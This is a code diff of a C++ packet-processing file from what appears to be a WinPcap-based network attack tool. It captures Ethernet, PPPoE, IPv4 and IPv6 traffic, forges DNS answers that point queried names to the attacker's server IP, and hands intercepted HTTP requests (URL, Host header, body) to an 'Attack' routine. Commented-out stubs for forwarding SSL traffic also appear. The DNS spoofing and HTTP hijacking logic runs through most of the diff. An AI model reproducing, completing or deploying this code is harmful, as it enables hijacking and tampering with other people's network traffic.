@@ -2,7 +2,7 @@
 #include "PacketProc.h"
 #include "Packet.h"
 #include "Public.h"
-
+#include "Utils/Tools.h"
 #include "HttpUtils.h"
 #include "attack.h"
 #include "utils/checksum.h"
@@ -10,13 +10,13 @@
 #include "informer.h"
 #include "attacker.h"
 #include "winpcap.h"
+#include "main.h"
+#include "udpPacket.h"
+#include "proxyPacket.h"
 
-
-
-
-#define MIN_DNS_PACKET_SIZE			20
-#define MIN_TCP_PACKET_SIZE			4
-#define CAPRAW_ERROR_FILENAME		"capraw_error.txt"
+Packet::Packet() {
+	attack = 0;
+}
 
 
 Packet::~Packet() {
@@ -27,10 +27,6 @@ Packet::~Packet() {
 
 Packet::Packet(unsigned long serverip, unsigned long localip, string userPluginPath,int mode, pcap_t * pcapt) {
 
-	if (mInstance)
-	{
-		return;
-	}
 	mInstance = this;
 
 	int iRet = 0;
@@ -40,7 +36,6 @@ Packet::Packet(unsigned long serverip, unsigned long localip, string userPluginP
 	mServerIP = serverip;
 	mLocalIP = localip;
 
-
 	mDnsAnswer.Name = htons(0xc00c);
 	mDnsAnswer.Type = htons(0x0001);
 	mDnsAnswer.Class = htons(0x0001);
@@ -48,7 +43,6 @@ Packet::Packet(unsigned long serverip, unsigned long localip, string userPluginP
 	mDnsAnswer.LowTTL = htons(0x0040);
 	mDnsAnswer.AddrLen = htons(0x0004);
 	mDnsAnswer.Address = mServerIP;
-
 
 	mDnsAnswerIPV6.Name = htons(0xc00c);
 	mDnsAnswerIPV6.Type = htons(0x001c);
@@ -62,8 +56,6 @@ Packet::Packet(unsigned long serverip, unsigned long localip, string userPluginP
 
 	attack = new Attack(userPluginPath, mServerIP);
 
-	Sleep(1000);
-
 	iRet = mInformer->notify(mLocalIP, "");
 }
 
@@ -72,11 +64,11 @@ Packet::Packet(unsigned long serverip, unsigned long localip, string userPluginP
 int Packet::parsePacket(const char * pData, int iCapLen) {
 	int iRet = 0;
 
+	LPMACHEADER pMac = 0;
 	LPPPPOEHEADER pppoe = 0;
 	LPIPHEADER pIPV4Hdr = 0;
 	LPIPV6HEADER pIPV6 = 0;
-	LPMACHEADER pMac = (LPMACHEADER)pData;
-	int iptype = Packet::getIPHdr(pMac, pppoe, pIPV4Hdr, pIPV6);
+	int iptype = Packet::getIPHdr((char*)pData,pMac, pppoe, pIPV4Hdr, pIPV6);
 	if (iptype <= 0)
 	{
 		return -1;
@@ -85,58 +77,86 @@ int Packet::parsePacket(const char * pData, int iCapLen) {
 	{
 		if (pIPV4Hdr->Version != 4)
 		{
-			printf("ipv4 header version error\r\n");
+			log("ipv4 header version:%d error\r\n", pIPV4Hdr->Version);
 			return -1;
 		}
 
 		int iIpv4HdrLen = pIPV4Hdr->HeaderSize << 2;
-		int iIpPackLen = ntohs(pIPV4Hdr->PacketSize);
+		int iIpPackLen = ntohs(pIPV4Hdr->PacketSize);	//14 + 20 + 8 + 16 + 4 = 62,mac + ip + udp + dns header + domain name
 		int realPackSize = iIpPackLen + ((char*)pIPV4Hdr - pData);
 		//dns:14 + 20 + 8 + 12 + 4 + 4=62 or tcp:14+20+20=54
-		if (realPackSize >= WINPCAP_MAX_PACKET_SIZE || realPackSize <= 0)
+		if (realPackSize >= WINPCAP_MAX_PACKET_SIZE || realPackSize < 0)
 		{
-			printf("ip packet length:%u,ip header length:%u error\r\n", iIpPackLen, iIpv4HdrLen);
+			log("ip length error,ip payload length:%u,ip header length:%u\r\n", iIpPackLen, iIpv4HdrLen);
 			return -1;
-		}
-		else if (realPackSize <= 60)
-		{
-			return realPackSize;
 		}
 
 		if (pIPV4Hdr->Protocol == IPPROTO_TCP)
 		{
+			if (realPackSize < 20)
+			{
+				return realPackSize;
+			}
+
 			LPTCPHEADER pTcpHdr = (LPTCPHEADER)((char*)pIPV4Hdr + iIpv4HdrLen);
 			int iTcpHdrLen = pTcpHdr->HeaderSize << 2;
 			char * packData = (char*)pTcpHdr + iTcpHdrLen;
 			int packDataLen = iIpPackLen - iIpv4HdrLen - iTcpHdrLen;
+
 			if (packDataLen <= MIN_TCP_PACKET_SIZE) {
-				return realPackSize;
+				//return realPackSize;
 			}
 
-			if (HttpUtils::isHttpPacket(packData))
-			{
-				string url = HttpUtils::getLongUrl(packData, packDataLen);
-				if (url == "")
+			unsigned short dport = ntohs(pTcpHdr->DstPort);
+			unsigned short sport = ntohs(pTcpHdr->SrcPort);
+			if (dport == SSL_PORT || sport == SSL_PORT) {
+				//if ( pIPV4Hdr->DstIP != pIPV4Hdr->SrcIP && (pIPV4Hdr->DstIP != mLocalIP || pIPV4Hdr->SrcIP != mLocalIP))
 				{
-					url = HttpUtils::getUrl(packData,packDataLen);
+					if (dport == SSL_PORT) 
+					{
+						//iRet = transferPacket(mPcapt, pMac, pppoe, pIPV4Hdr, pTcpHdr, mLocalIP, pData, realPackSize, 0);
+					}
+				}		
+
+				//if (pIPV4Hdr->DstIP == pIPV4Hdr->SrcIP && pIPV4Hdr->DstIP == mLocalIP) 
+				{
+					if (sport == SSL_PORT) {
+						//iRet = transferPacket(mPcapt, pMac, pppoe, pIPV4Hdr, pTcpHdr, mLocalIP, pData, realPackSize, 1);
+					}
+					
+				}
+			}
+			else {
+				int httpActLen = HttpUtils::isHttpPacket(packData);
+				if (httpActLen)
+				{
+					string url = HttpUtils::getLongUrl(packData + httpActLen, packDataLen - httpActLen);
 					if (url == "")
 					{
-						return realPackSize;
+						url = HttpUtils::getUrl(packData + httpActLen, packDataLen - httpActLen);
+						if (url == "") {
+							return realPackSize;
+						}
+					}
+
+					char* httpdata = 0;
+
+					string httphdr = HttpUtils::getHttpHeader(packData, packDataLen, &httpdata);
+
+					string host = HttpUtils::getValueFromKey(httphdr.c_str(), string("Host"));
+					if (gAttackMode == ATTACK_STANDBY_MODE) {
+						iRet = attack->attack(url.c_str(), host.c_str(), httpdata, mPcapt, pData, realPackSize, (CHAR*)pIPV4Hdr, iptype, pppoe);
 					}
 				}
-				string host = HttpUtils::getValueFromKey(packData, string("Host"));
-
-				char * httpdata = 0;
-
-				string httphdr = HttpUtils::getHttpHeader(packData, packDataLen, &httpdata);
-
-				iRet = attack->attack(url.c_str(), host.c_str(), httpdata, mPcapt, pData, realPackSize, (CHAR*)pIPV4Hdr, iptype, pppoe);
 			}
 
 			return realPackSize;
 		}
 		else if (pIPV4Hdr->Protocol == IPPROTO_UDP)
 		{
+			iRet = udpPacket(mPcapt, pMac, pppoe, pIPV4Hdr, &mDnsAnswer, mMode, mLocalIP, pData,realPackSize, mInformer);
+			
+			/*
 			LPUDPHEADER pUdpHdr = (LPUDPHEADER)((char*)pIPV4Hdr + iIpv4HdrLen);
 			unsigned short usDport = ntohs(pUdpHdr->DstPort);
 			if (usDport != DNS_PORT) {
@@ -151,11 +171,12 @@ int Packet::parsePacket(const char * pData, int iCapLen) {
 			}
 
 			LPDNSHEADER pDnsHdr = (LPDNSHEADER)((char*)pUdpHdr + sizeof(UDPHEADER));
-			if (mMode == 3 )
+			if (mMode == 3 || mMode == 1)
 			{
 				if (pDnsHdr->TransactionID == LOCAL_QUERY_DNS_ID)
 				{
-					if (pIPV4Hdr->SrcIP == mLocalIP && pIPV4Hdr->DstIP == LOCAL_DNS_QUERY_SERVER)
+					if (pIPV4Hdr->SrcIP == mLocalIP && 
+						(pIPV4Hdr->DstIP == BACK_DNS_SERVER_ADDRESS || pIPV4Hdr->DstIP == DNS_SERVER_ADDRESS))
 					{
 						return realPackSize;
 					}
@@ -167,7 +188,6 @@ int Packet::parsePacket(const char * pData, int iCapLen) {
 			if (iRet == 0) {
 				return realPackSize;
 			}
-
 
 			if (pppoe != 0)
 			{
@@ -220,14 +240,16 @@ int Packet::parsePacket(const char * pData, int iCapLen) {
 			else {
 				printf("pcap_sendpacket dns:%s,length:%u error\r\n", dnsname, realPackSize + sizeof(DNSANSWER));
 			}
+			*/
 		}
+		
 		return realPackSize;
 	}
 	else if (iptype == 2)
 	{
 		if (pIPV6->Version != 6)
 		{
-			printf("ipv6 header version error\r\n");
+			printf("ipv6 version:%d error\r\n", pIPV6->Version);
 			return -1;
 		}
 
@@ -235,7 +257,7 @@ int Packet::parsePacket(const char * pData, int iCapLen) {
 		int realPackSize = iIpPackLen + ((char*)pIPV6 - pData) + sizeof(IPV6HEADER);
 		if (realPackSize >= WINPCAP_MAX_PACKET_SIZE || realPackSize <= 0)
 		{
-			printf("ipv6 payload length:%u,header length:%u error\r\n", iIpPackLen, sizeof(IPV6HEADER));
+			printf("ipv6 length error,payload length:%u,header length:%u\r\n", iIpPackLen, sizeof(IPV6HEADER));
 			return -1;
 		}
 
@@ -249,29 +271,42 @@ int Packet::parsePacket(const char * pData, int iCapLen) {
 				return realPackSize;
 			}
 
-			if (HttpUtils::isHttpPacket(packData))
-			{
-				string url = HttpUtils::getLongUrl(packData, packDataLen);
-				if (url == "")
+			unsigned short tport = ntohs(pTcpHdr->DstPort);
+			if (tport == SSL_PORT) {
+
+			}
+			else {
+				int httpActLen = HttpUtils::isHttpPacket(packData);
+				if (httpActLen)
 				{
-					url = HttpUtils::getUrl(packData,packDataLen);
-					if (url == "") {
-						return realPackSize;
+					string url = HttpUtils::getLongUrl(packData + httpActLen, packDataLen - httpActLen);
+					if (url == "")
+					{
+						url = HttpUtils::getUrl(packData + httpActLen, packDataLen - httpActLen);
+						if (url == "") {
+							return realPackSize;
+						}
+					}
+
+					char* httpdata = 0;
+
+					string httphdr = HttpUtils::getHttpHeader(packData, packDataLen, &httpdata);
+
+					string host = HttpUtils::getValueFromKey(httphdr.c_str(), string("Host"));
+					if (gAttackMode == ATTACK_STANDBY_MODE) {
+						iRet = attack->attack(url.c_str(), host.c_str(), httpdata, mPcapt, pData, realPackSize, (CHAR*)pIPV6, iptype, pppoe);
 					}
 				}
-				string host = HttpUtils::getValueFromKey(packData, string("Host"));
-
-				char * httpdata = 0;
-
-				string httphdr = HttpUtils::getHttpHeader(packData, packDataLen, &httpdata);
-
-				iRet = attack->attack(url.c_str(), host.c_str(), httpdata, mPcapt, pData, realPackSize, (CHAR*)pIPV6, iptype, pppoe);
 			}
 
 			return realPackSize;
 		}
 		else if (pIPV6->NextPacket == IPPROTO_UDP)
 		{
+
+			iRet = udpPacketIPV6(mPcapt, pMac, pppoe, pIPV6, &mDnsAnswerIPV6, &mDnsAnswer, mMode, mLocalIP, pData, realPackSize, mInformer);
+			
+			/*
 			LPUDPHEADER pUDPHdr = (LPUDPHEADER)((char*)pIPV6 + sizeof(IPV6HEADER));
 			unsigned short usDport = ntohs(pUDPHdr->DstPort);
 			if (usDport != DNS_PORT) {
@@ -285,7 +320,7 @@ int Packet::parsePacket(const char * pData, int iCapLen) {
 			}
 
 			LPDNSHEADER pDnsHdr = (LPDNSHEADER)((char*)pUDPHdr + sizeof(UDPHEADER));
-			if (mMode == 3)
+			if (mMode == 3 || mMode == 1)
 			{
 				if (pDnsHdr->TransactionID == LOCAL_QUERY_DNS_ID)
 				{
@@ -367,6 +402,7 @@ int Packet::parsePacket(const char * pData, int iCapLen) {
 			{
 				printf("pcap_sendpacket ipv6 dns:%s,length:%u error\r\n", dnsname, realPackSize + iSize);
 			}
+			*/
 		}
 		return realPackSize;
 	}
@@ -376,9 +412,22 @@ int Packet::parsePacket(const char * pData, int iCapLen) {
 
 
 
-int Packet::getIPHdr(LPMACHEADER mac, LPPPPOEHEADER & pppoe, LPIPHEADER &ip, LPIPV6HEADER &ipv6) {
-	char * nexthdr = (char*)mac + sizeof(MACHEADER);
+int Packet::getIPHdr(char * packet,LPMACHEADER & mac, LPPPPOEHEADER & pppoe, LPIPHEADER &ip, LPIPV6HEADER &ipv6) {
+
+	if (*(DWORD*)packet == AF_INET || *(DWORD*)packet == AF_UNIX) {
+		ip = (LPIPHEADER)((char*)packet + 4);
+		mac = 0;
+		return 1;
+	}
+	else if (*(DWORD*)packet == AF_INET6) {
+		ipv6 = (LPIPV6HEADER)((char*)packet + 4);
+		mac = 0;
+		return 2;
+	}
+
+	mac = (LPMACHEADER)packet;
 	int nextprotocol = mac->Protocol;
+	char * nexthdr = (char*)packet + sizeof(MACHEADER);
 	if (nextprotocol == 0x0081)
 	{
 		LPHEADER8021Q p8021q = (LPHEADER8021Q)nexthdr;
